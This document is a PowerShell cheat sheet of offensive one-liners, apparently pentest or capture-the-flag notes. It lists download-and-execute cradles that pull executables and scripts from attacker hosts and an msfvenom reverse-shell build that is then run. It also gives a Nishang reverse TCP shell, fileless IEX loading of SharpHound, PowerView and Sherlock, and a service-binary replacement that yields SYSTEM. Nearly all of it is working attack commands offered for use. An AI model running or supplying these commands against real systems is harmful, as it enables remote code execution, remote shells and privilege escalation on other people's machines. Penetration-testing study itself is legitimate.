# PowerShell File Manipulation

## Invoke-WebRequest
```
Invoke-WebRequest "http://10.2.3.85/ASCService.exe" -OutFile "ASCService.exe"
powershell -c Invoke-WebRequest "http://10.2.3.85/ASCService.exe" -OutFile "ASCService.exe"
powershell -c start-service AdvancedSystemCareService9

WOOTWOOT
c:\Windows\system32>whoami
nt authority\system
```

## New-Object System.Net.WebClient (alternate download method)
```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.2.3.85/shell.exe','shell.exe')"
```

## MsfVenom Shell Download and Run (two-liner)
```
msfvenom --payload windows/x64/shell_reverse_tcp LHOST=10.13.48.232 LPORT=9001 --format exe > shell.exe
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.48.232/shell.exe','c:\temp\shell.exe')";powershell.exe c:\temp\shell.exe
```

## Nishang Shell (Running PS1 without saving to disk)
```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.2.3.85/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.2.3.85 -Port 443
```

## Fileless (Running PS1 without saving to disk)
```
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6:8000/SharpHound.ps1')
IEX(New-Object Net.WebClient).downloadString('http://192.168.10.1:8000/PowerView.ps1')
```

## Fileless (Run and Execute)
```
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.19:8000/Sherlock.ps1') | powershell -noprofile - 
```

## Fileless ComObject
```
$h=New-Object -ComObject Msxml2.XMLHttp;$h.open('GET','http://192.168.10.1:8000/SharpHound.ps1',$false);$h.send();iex $h.responseText
```

## Fileless WinAPI
```
$wr = [System.NET.WebRequest]::Create("http://192.168.10.1:8000/SharpHound.ps1") 
$r = $wr.GetResponse() 
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```